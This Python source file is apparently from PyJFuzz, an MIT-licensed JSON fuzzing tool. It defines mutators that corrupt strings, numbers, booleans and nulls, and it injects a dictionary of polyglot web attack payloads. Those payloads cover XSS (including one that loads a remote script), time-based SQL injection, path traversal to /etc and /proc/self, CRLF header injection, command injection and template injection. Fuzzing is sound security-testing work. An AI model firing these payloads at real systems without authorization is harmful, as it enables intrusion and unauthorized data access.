"""
The MIT License (MIT)

Copyright (c) 2016 Daniele Linguaglossa <d.linguaglossa@mseclab.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NON INFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import random
import string
import re
import struct
import math
import sys

if sys.version_info >= (3, 0):
    long = int
    unicode = str


class PJFMutators(object):
    """
    Class that represent all the available mutators based on type
    """

    def __init__(self, configuration):
        self.random_chars = string.printable[:-5]
        self.config = configuration
        self.json_fuzzer = self.fuzz
        self.string_mutator = {
            0: lambda x: False,
            1: lambda x: self.json_fuzzer(self.get_string_polyglot_attack(x)),
            2: lambda x: "",
            3: lambda x: [x],
            4: lambda x: [{str(x): str(x)}],
            5: lambda x: {"param": self.json_fuzzer(self.get_string_polyglot_attack(x))},
            6: lambda x: 0,
        }

        self.boolean_mutator = {
            0: lambda x: not x,
            1: lambda x: str(x),
            2: lambda x: str(not x),
            3: lambda x: int(x),
            4: lambda x: int(not x),
            5: lambda x: float(x),
            6: lambda x: float(not x),
        }

        self.int_mutator = {
            0: lambda x: x ^ 0xffffff,
            1: lambda x: -x,
            2: lambda x: "%s" % x,
            3: lambda x: x | 0xff,
            4: lambda x: random.randint(-2147483647, 2147483647),
            5: lambda x: bool(x),
            6: lambda x: x | 0xff000000
        }

        self.float_mutator = {
            0: lambda x: float(int(round(x, 0)) ^ 0xffffff),
            1: lambda x: -x,
            2: lambda x: "%s" % x,
            3: lambda x: float(int(round(x, 0)) | 0xff),
            4: lambda x: float(random.randint(-2147483647, 2147483647)*0.1),
            5: lambda x: bool(round(x, 0)),
            6: lambda x: float(int(round(x, 0)) | 0xff000000)
        }

        self.null_mutator = {
            0: lambda x: float('0.111111111111111111111'),
            1: lambda x: int(bool(x)),
            2: lambda x: bool(x),
            3: lambda x: float('9999999999999999999.111'),
            4: lambda x: {},
            5: lambda x: [int(bool(x))],
            6: lambda x: float('1337.333333333333333333')
        }

        self.mutator = {
            str: self.string_mutator,
            bool: self.boolean_mutator,
            int: self.int_mutator,
            float: self.float_mutator,
            long: self.int_mutator,
            type(None): self.null_mutator,
        }

        self.polyglot_attacks = {
            0: "jaVasCript:/*-/*\x60/*\x60/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</tit"
               "Le/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(\%s\)//>\x3e",
            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
               "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
               "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
            2: "/../../../../etc/%s",
            3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
            4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
               "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
            5: "%s&sleep 5&id'\\\"\x600&sleep 5&id\x60'",
            6: "..\\..\\..\\..\\%s.ini",
            7: "data:text/html,https://%s:a.it@www.\\it",
            8: "file:///proc/self/%s",
            9: "\x0d\x0aCC: %s@mail.it\x0d\x0aLocation: www.google.it",
            10: "||cmd.exe&&id||%s",
            11: "${7*7}a{{%s}}b",
            12: "{{'%s'*7}}",
            13: "#{%%x['%s']}+foo",
            14: "".join(self.random_chars[random.randint(0, 94)]
                        for _ in range(0, random.randint(1, 30))).replace("%", "%%") + "%s"
        }

    def _get_random(self, obj_type):
        """
        Get a random mutator from a list of mutators
        """
        return self.mutator[obj_type][random.randint(0, self.config.level)]

    def get_mutator(self, obj, obj_type):
        """
        Get a random mutator for the given type
        """
        if obj_type == unicode:
            obj_type = str
            obj = str(obj)
        return self._get_random(obj_type)(obj)

    def get_string_polyglot_attack(self, obj):
        """
        Return a polyglot attack containing the original object
        """
        return self.polyglot_attacks[random.choice(self.config.techniques)] % obj

    def fuzz(self, obj):
        """
        Perform the fuzzing
        """
        buf = list(obj)
        FuzzFactor = random.randrange(1, len(buf))
        numwrites=random.randrange(math.ceil((float(len(buf)) / FuzzFactor)))+1
        for j in range(numwrites):
            self.random_action(buf)
        return self.safe_unicode(buf)

    def random_action(self, b):
        """
        Perform the actual fuzzing using random strategies
        """
        action = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])
        if len(b) >= 3:
            pos = random.randint(0, len(b)-2)
            if action == 1:
                rbyte = random.randrange(256)
                rn = random.randrange(len(b))
                b[rn] = "%c" % rbyte
            elif action == 2:
                howmany = random.randint(1, 100)
                curpos = pos
                for _ in range(0, howmany):
                    b.insert(curpos, b[pos])
                    pos += 1
            elif action == 3:
                n = random.choice([1, 2, 4])
                for _ in range(0, n):
                    if len(b) > pos+1:
                        tmp = b[pos]
                        b[pos] = b[pos+1]
                        b[pos+1] = tmp
                        pos += 1
                    else:
                        pos -= 2
                        tmp = b[pos]
                        b[pos] = b[pos+1]
                        b[pos+1] = tmp
                        pos += 1
            elif action in [4, 5]:
                op = {
                    4: lambda x, y: ord(x) << y,
                    5: lambda x, y: ord(x) >> y,
                }
                n = random.choice([1, 2, 4])
                if len(b) < pos+n:
                    pos = len(b) - (pos+n)
                if n == 1:
                    f = "<B"
                    s = op[action](b[pos], n) % 0xff
                elif n == 2:
                    f = "<H"
                    s = op[action](b[pos], n) % 0xffff
                elif n == 4:
                    f = "<I"
                    s = op[action](b[pos], n) % 0xffffff
                val = struct.pack(f, s)
                for v in val:
                    if isinstance(v, int):
                        v = chr(v)
                    b[pos] = v
                    pos += 1
            elif action == 6:
                b.insert(random.randint(0, len(b)-1), random.choice(["\"", "[", "]", "+", "-", "}", "{"]))
            elif action == 7:
                del b[random.randint(0, len(b)-1)]
            elif action in [8, 9]:
                block = random.choice([
                    (r"\"", r"\""),
                    (r"\[", r"\]"),
                    (r"\{", r"\}")
                ])
                b_str = self.safe_join(b)
                block_re = re.compile(str(".+({0}[^{2}{3}]+{1}).+").format(block[0], block[1], block[0], block[1]))
                if block_re.search(b_str):
                    r = random.choice(block_re.findall(b_str))
                    random_re = re.compile("({0})".format(re.escape(r)))
                    if random_re.search(b_str):
                        if action == 8:
                            newarr = list(random_re.sub("", b_str))
                            b[:] = newarr
                        else:
                            newarr = list(random_re.sub("\\1" * random.randint(1, 10), b_str, 1))
                            b[:] = newarr
            elif action == 10:
                b_str = self.safe_join(b)
                limit_choice = random.choice([
                    0x7FFFFFFF,
                    -0x80000000,
                    0xff,
                    -0xff,
                ])
                block_re = re.compile("(\-?[0-9]+)")
                if block_re.search(b_str):
                    block = random.choice([m for m in block_re.finditer(b_str)])
                    new = b_str[0:block.start()] + str(int(block.group())*limit_choice) + b_str[block.start() +
                                                                                                len(block.group()):]
                    b[:] = list(new)

    def safe_join(self, buf):
        """
        Safely join a list of character
        """
        tmp_buf = ""
        for character in buf:
            tmp_buf += character
        return tmp_buf

    def safe_unicode(self, buf):
        """
        Safely return an unicode encoded string
        """
        tmp = ""
        buf = "".join(b for b in buf)
        for character in buf:
            tmp += character
        return tmp
